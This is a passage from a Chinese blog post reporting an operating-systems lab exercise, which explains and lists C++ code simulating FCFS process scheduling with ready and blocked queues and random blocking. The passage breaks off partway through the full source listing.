src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/image-20211112130639647.png" alt="image-20211112130639647"></p><h2 id="四、实验设计和过程"><a href="#四、实验设计和过程" class="headerlink" title="四、实验设计和过程"></a>四、实验设计和过程</h2><h3 id="FCFS调度算法"><a href="#FCFS调度算法" class="headerlink" title="FCFS调度算法"></a>FCFS调度算法</h3><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //进程结构体，表示进程信息</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//进程名字</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//到达时间</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//进程运行时间</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//进程等待时间</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//进程剩余运行时间</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//周转时间</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//进程开始运行时间</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//进程结束时间</span><br>    <span class="hljs-comment">//int time_slice;      //进程时间片</span><br>&#125; run_process, p[MAXname];<br>queue&lt;Process&gt; ready_queue, block_queue;<br></code></pre></td></tr></table></figure><h4 id="符号说明"><a href="#符号说明" class="headerlink" title="符号说明"></a>符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//进程数量</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><h5 id="进程初始化函数"><a href="#进程初始化函数" class="headerlink" title="进程初始化函数"></a><strong>进程初始化函数</strong></h5><blockquote><p>获取进程信息</p><ul><li>将进程按照到达时间加入阻塞队列</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程初始化</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入进程数量&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">&quot;个进程的名字  到达时间  服务时间&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; p[i].name &gt;&gt; p[i].arrive_time &gt;&gt; p[i].service_time;<br>        p[i].remain_time = p[i].service_time;<br>    &#125;<br>    run_process.name = <span class="hljs-string">&quot;0&quot;</span>; <span class="hljs-comment">//当前无进程运行</span><br>    <span class="hljs-built_in">sort</span>(p, p + n, cmp);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        block_queue.<span class="hljs-built_in">push</span>(p[i]); <span class="hljs-comment">//将进程加入阻塞队列（未达到则视为阻塞）</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="获取下一个进程函数"><a href="#获取下一个进程函数" class="headerlink" title="获取下一个进程函数"></a><strong>获取下一个进程函数</strong></h5><blockquote><p>这部分代码重复率较高，故抽象出来组成函数</p><ul><li>当就绪队列非空时，从中取出一个进程运行，同时计算该进程的等待时间</li><li>否则将当前进程置为空</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nextprocess</span><span class="hljs-params">()</span> <span class="hljs-comment">//取下一个进程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//当就绪队列非空时</span><br>    &#123;<br>        run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//取下个进程</span><br>        run_process.start_time=current_time;<br>        run_process.wait_time += current_time - run_process.arrive_time; <span class="hljs-comment">//计算等待时间</span><br>        ready_queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">//否则将运行进程置为空</span><br>        run_process.name = <span class="hljs-string">&quot;0&quot;</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h5 id="进程调度函数"><a href="#进程调度函数" class="headerlink" title="进程调度函数"></a><strong>进程调度函数</strong></h5><blockquote><p>实现进程调度</p><ul><li>当就绪队列、阻塞队列、运行进程都为空时，说明进程全部运行完，结束程序</li><li>当阻塞队列非空且队首元素到达时间已到当前时间，则将阻塞队列队首元素加入就绪队列，并将其从阻塞队列删除</li><li>就绪队列非空和运行进程为空时，则从就绪队列取元素，并将其从阻塞队列删除</li><li>当有进程运行时，输出进程信息，同时改变当前时间等信息</li><li>如果当前进程时间片用完，则将其记录，同时获取下一个进程，程序继续循环</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程调度函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机数种子</span><br>    cout &lt;&lt; endl<br>         &lt;&lt; <span class="hljs-string">&quot;------------------------------------FCFS调度算法------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;当前时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;当前进程  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程到达时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程等待时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;剩余运行时间  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//当三个队列均为空时，说明进程全部运行完</span><br>            <span class="hljs-keyword">break</span>;                                                                 <span class="hljs-comment">//结束</span><br><br>        <span class="hljs-keyword">if</span> (!block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; block_queue.<span class="hljs-built_in">front</span>().arrive_time &lt;= current_time)<br>        &#123;                                                   <span class="hljs-comment">//阻塞队列非空且队首元素到达时间已到当前时间</span><br>            block_queue.<span class="hljs-built_in">front</span>().arrive_time = current_time; <span class="hljs-comment">//将进入就绪队列的时间作为进程到达时间（针对于阻塞过的进程）</span><br>            ready_queue.<span class="hljs-built_in">push</span>(block_queue.<span class="hljs-built_in">front</span>());          <span class="hljs-comment">//则加入就绪队列</span><br>            block_queue.<span class="hljs-built_in">pop</span>();                              <span class="hljs-comment">//从阻塞队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//就绪队列非空和运行进程为空时</span><br>        &#123;<br>            run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//则从就绪队列取首元素</span><br>            run_process.start_time=current_time;<br>            ready_queue.<span class="hljs-built_in">pop</span>();                 <span class="hljs-comment">//从就绪队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//若当前无运行进程，则输出空</span><br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name &lt;&lt; endl;<br>            current_time++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123; <span class="hljs-comment">//当前有运行进程则输出信息</span><br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.arrive_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.wait_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.service_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.remain_time<br>                 &lt;&lt; endl;<br>            current_time++;            <span class="hljs-comment">//当前时间加1</span><br>            run_process.remain_time--; <span class="hljs-comment">//进程剩余运行时间减1</span><br><br>            <span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程剩余运行时间为0</span><br>            &#123;<br>                run_process.end_time=current_time;<br>                run_process.turnaround_time=current_time-run_process.start_time;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//当进程有运行时间和时间片时，可能发生阻塞</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------进程阻塞，切换进程----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//若发生阻塞，修改当前进程到达时间</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//并加入阻塞队列中</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="打印进程信息函数"><a href="#打印进程信息函数" class="headerlink" title="打印进程信息函数"></a><strong>打印进程信息函数</strong></h5><blockquote><p>输出进程信息，并输出整个过程的平均等待时间</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_process_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//输出进程信息</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">float</span> sumwait = <span class="hljs-number">0</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;进程名字  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;到达时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;开始执行时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;结束执行时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;周转时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;等待时间  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; p[i].name<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].arrive_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].service_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].start_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; p[i].end_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].turnaround_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].wait_time<br>             &lt;&lt; endl;<br>        sumwait += p[i].wait_time;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;平均等待时间为：&quot;</span> &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-built_in">setiosflags</span>(ios::fixed) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">float</span></span>(sumwait / n) &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="阻塞函数"><a href="#阻塞函数" class="headerlink" title="阻塞函数"></a>阻塞函数</h5><blockquote><p>随机概率阻塞</p><p>设置了30%的阻塞概率</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">block</span><span class="hljs-params">()</span> <span class="hljs-comment">//阻塞函数，随机概率阻塞</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a;<br>    a = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">//return 0;</span><br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">0</span> &amp;&amp; a &lt; <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXname 100</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //进程结构体，表示进程信息</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//进程名字</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//到达时间</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//进程运行时间</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//进程等待时间</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//进程剩余运行时间</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//周转时间</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//进程开始运行时间</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//进程结束时间</span><br>    <span class="hljs-comment">//int time_slice;      //进程时间片</span><br>&#125; run_process, p[MAXname];<br><br><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//进程数量</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>queue&lt;Process&gt; ready_queue, block_queue, run_queue;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(Process &amp;a, Process &amp;b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a.arrive_time &lt; b.arrive_time;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程初始化</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入进程数量&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">&quot;个进程的名字  到达时间  服务时间&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; p[i].name &gt;&gt; p[i].arrive_time &gt;&gt; p[i].service_time;<br>        p[i].remain_time = p[i].service_time;<br>    &#125;<br>    run_process.name = <span class="hljs-string">&quot;0&quot;</span>; <span class="hljs-comment">//当前无进程运行</span><br>    <span class="hljs-built_in">sort</span>(p, p + n, cmp);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        block_queue.<span class="hljs-built_in">push</span>(p[i]); <span class="hljs-comment">//将进程加入阻塞队列（未达到则视为阻塞）</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nextprocess</span><span class="hljs-params">()</span> <span class="hljs-comment">//取下一个进程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//当就绪队列非空时</span><br>    &#123;<br>        run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//取下个进程</span><br>        run_process.start_time=current_time;<br>        run_process.wait_time += current_time - run_process.arrive_time; <span class="hljs-comment">//计算等待时间</span><br>        ready_queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">//否则将运行进程置为空</span><br>        run_process.name = <span class="hljs-string">&quot;0&quot;</span>;<br>    <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">block</span><span class="hljs-params">()</span> <span class="hljs-comment">//阻塞函数，随机概率阻塞</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a;<br>    a = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">//return 0;</span><br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">0</span> &amp;&amp; a &lt; <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程调度函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机数种子</span><br>    cout &lt;&lt; endl<br>         &lt;&lt; <span class="hljs-string">&quot;------------------------------------FCFS调度算法------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;当前时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;当前进程  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程到达时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程等待时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;剩余运行时间  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//当三个队列均为空时，说明进程全部运行完</span><br>            <span class="hljs-keyword">break</span>;                                                                 <span class="hljs-comment">//结束</span><br><br>        <span class="hljs-keyword">if</span> (!block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; block_queue.<span class="hljs-built_in">front</span>().arrive_time &lt;= current_time)<br>        &#123;                                                   <span class="hljs-comment">//阻塞队列非空且队首元素到达时间已到当前时间</span><br>            block_queue.<span class="hljs-built_in">front</span>().arrive_time = current_time; <span class="hljs-comment">//将进入就绪队列的时间作为进程到达时间（针对于阻塞过的进程）</span><br>            ready_queue.<span class="hljs-built_in">push</span>(block_queue.<span class="hljs-built_in">front</span>());          <span class="hljs-comment">//则加入就绪队列</span><br>            block_queue.<span class="hljs-built_in">pop</span>();                              <span class="hljs-comment">//从阻塞队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//就绪队列非空和运行进程为空时</span><br>        &#123;<br>            run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//则从就绪对列取首元素</span><br>            run_process.start_time=current_time;<br>            ready_queue.<span class="hljs-built_in">pop</span>();                 <span class="hljs-comment">//从就绪队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//若当前无运行进程，则输出空</span><br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span 